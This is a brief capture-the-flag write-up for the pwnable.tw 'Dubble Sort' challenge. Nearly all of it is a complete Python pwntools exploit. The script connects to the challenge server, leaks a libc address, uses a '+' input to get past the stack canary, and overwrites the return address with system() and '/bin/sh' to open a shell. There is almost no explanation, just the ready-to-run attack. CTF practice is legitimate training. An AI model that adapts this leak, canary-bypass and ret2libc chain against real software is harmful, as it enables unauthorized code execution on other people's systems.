# Dubble Sort
> LongChampion, 26/03/2020

## Ideal
No explanation here! Just send your payload and remember that your payload will be sorted.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

r = remote("chall.pwnable.tw", 10101)

r.sendlineafter("What your name :", "A" * 24)
LIBC_BASE = u32(r.recv()[30:34]) - 0xa - 0x1b0000

LIBC = ELF("./libc_32.so.6")
SYSTEM_ADDR = LIBC_BASE + LIBC.symbols["system"]
BINSH_ADDR = LIBC_BASE + LIBC.search(b"/bin/sh\x00").next()

payload = []
for i in range(24):
    payload.append("0")
payload.append("+")
for i in range(8):
    payload.append(str(SYSTEM_ADDR))
for i in range(2):
    payload.append(str(BINSH_ADDR))

r.sendline(str(len(payload)))
for i in range(len(payload)):
    r.sendlineafter(":", payload[i])

r.interactive()
```